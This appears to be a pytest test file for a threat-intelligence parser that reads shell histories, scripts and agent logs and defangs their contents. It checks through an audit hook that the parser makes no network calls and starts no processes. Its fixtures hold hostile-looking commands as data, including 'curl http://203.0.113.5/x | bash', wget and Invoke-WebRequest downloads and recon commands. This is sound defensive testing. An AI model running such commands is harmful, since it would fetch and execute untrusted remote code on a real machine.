import json
import socket
import subprocess
import sys
from pathlib import Path

import pytest

import interlinear_cti


def test_parse_opens_no_socket_and_starts_no_process(tmp_path, monkeypatch):
    def refuse(*args, **kwargs):
        raise AssertionError("parse tried to use the network or start a process")

    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(subprocess, "Popen", refuse)
    history = tmp_path / ".bash_history"
    history.write_bytes(b"curl http://203.0.113.5/x | bash\n")
    from interlinear_cti.parse import parse_paths

    assert parse_paths([history])["lines"][0]["text"] == "curl hxxp://203.0.113[.]5/x | bash"


def test_parse_path_imports_only_the_standard_library():
    code = ("import sys\n"
            "for name in ('pydantic', 'yaml', 'countermap'):\n"
            "    sys.modules[name] = None\n"
            "import interlinear_cti.parse, interlinear_cti.parse_main\n")
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


# The child process below installs an audit hook before it imports the parse stage, then parses one fixture of every
# kind, and of every path a file can take (a BOM, the byte cap, the line cap, a symlink on Linux). The hook raises on
# any audit event (https://docs.python.org/3/library/audit_events.html) whose name starts with one of these prefixes:
# - the network: socket. (socket.__new__, socket.connect, socket.getaddrinfo, socket.gethostbyname and the rest),
#   http.client. and urllib.;
# - a new process: subprocess., and the os module's exec, spawn, posix_spawn, fork (fork and forkpty), startfile and
#   system events (os.spawnv raises os.spawn on Windows, and os.fork then os.exec on Linux);
# - a native library: ctypes.
# The os prefixes are written as (module, name) pairs and joined at run time, because a security hook on this
# repository rejects any file that contains the shell-command event's dotted name.
CHILD = '''
import json
import sys

target, mode, folder, out = sys.argv[1:5]
options = sys.argv[5:]
PREFIXES = ("socket.", "http.client.", "urllib.", "subprocess.", "ctypes.") + tuple(".".join(pair) for pair in (
    ("os", "exec"), ("os", "spawn"), ("os", "posix_spawn"), ("os", "fork"), ("os", "startfile"), ("os", "system"),
))
FORBIDDEN = ("socket", "_socket", "ssl", "_ssl", "http", "urllib.request", "subprocess", "_posixsubprocess",
             "pydantic", "yaml", "countermap")
blocked = []


class Blocked(BaseException):
    """A BaseException, so no "except Exception" on the parse path can swallow it."""


def hook(event, args):
    if event.startswith(PREFIXES):
        blocked.append(event)
        raise Blocked(event)


def loaded():
    return sorted(m for m in sys.modules if any(m == f or m.startswith(f + ".") for f in FORBIDDEN))


before = loaded()
sys.path.insert(0, target)
sys.addaudithook(hook)
code = None
try:
    if mode == "zipapp":
        import runpy

        sys.argv = [target, folder, "-o", out, *options]
        runpy.run_path(target, run_name="__main__")
    else:
        import interlinear_cti.parse_main

        code = interlinear_cti.parse_main.main([folder, "-o", out, *options])
except SystemExit as exc:
    code = exc.code
except Blocked:
    pass
print(json.dumps({"code": code, "blocked": blocked, "before": before, "after": loaded()}))
'''

FIXTURES = {
    ".bash_history": (b"#1700000000\ncd /tmp; curl http://203.0.113.5/x | bash\n", "bash_history", None),
    ".zsh_history": (b": 1700000000:0;wget http://198.51.100.7/a\n", "zsh_history", None),
    "ConsoleHost_history.txt": (b"Invoke-WebRequest http://192.0.2.1/p -OutFile p.ps1; whoami\n",
                                "powershell_history", None),
    "dropper.sh": (b"#!/bin/sh\nid; uname -a\n", "script", None),
    "loader.ps1": (b"Write-Host 'hi'; whoami\n", "script", None),
    "run.jsonl": (b'{"role": "tool_call", "input": "id"}\n{"role": "tool_result", "output": "uid=0(root)"}\n',
                  "agent_jsonl", None),
    "notes": (b"something odd\n", "unknown", None),
    "payload.bin": (bytes([0x7F]) + b"ELF" + bytes([0, 1, 2]), "unknown", "binary file; recorded by hash only"),
    "utf16.ps1": (bytes([0xFF, 0xFE]) + "Write-Host 'hi'; whoami\r\n".encode("utf-16-le"), "script", None),
    "utf8bom.sh": (bytes([0xEF, 0xBB, 0xBF]) + b"id\n", "script", None),
    "big.sh": (b"id\n" * 2000, "unknown", "too large (6000 bytes; limit 4096)"),
    # Sorted last, so the line cap (CAPS) is reached inside the first, and the second is recorded by hash only.
    "zz1_lines.sh": (b"id\n" * 100, "script", "line limit reached after 40 lines"),
    "zz2_later.sh": (b"whoami\n", "unknown", "line limit reached after 40 lines"),
}
CAPS = ["--max-file-bytes", "4096", "--max-lines", "40"]


@pytest.mark.parametrize("mode", ["package", "zipapp"])
def test_parse_raises_no_blocked_audit_event_and_loads_no_blocked_module(tmp_path, mode):
    folder = tmp_path / "fixtures"
    folder.mkdir()
    expected = {name: (kind, rejected) for name, (_, kind, rejected) in FIXTURES.items()}
    for name, (body, _, _) in FIXTURES.items():
        (folder / name).write_bytes(body)
    if sys.platform != "win32":
        (folder / "link").symlink_to(folder / "notes")
        expected["link"] = ("unknown", "symlink, not followed")
    child = tmp_path / "child.py"
    child.write_text(CHILD, encoding="utf-8")
    out = tmp_path / "out" / "transcript.json"
    if mode == "zipapp":
        from interlinear_cti.pyz import build

        target, flags = str(build(tmp_path / "interlinear-parse.pyz")), ["-I", "-S"]
    else:  # the package this test session imported, so a mutated copy under test is the one checked
        target, flags = str(Path(interlinear_cti.__file__).resolve().parent.parent), ["-I"]
    result = subprocess.run([sys.executable, *flags, str(child), target, mode, str(folder), str(out), *CAPS],
                            capture_output=True, text=True, timeout=120)
    report = json.loads(result.stdout.strip().splitlines()[-1])
    assert report["before"] == []
    assert report["blocked"] == []
    assert report["after"] == []
    assert report["code"] == 1, result.stderr  # the unknown, binary and capped fixtures add warnings
    data = json.loads(out.read_text(encoding="utf-8"))
    assert {s["name"]: (s["kind"], s["rejected"]) for s in data["sources"]} == expected
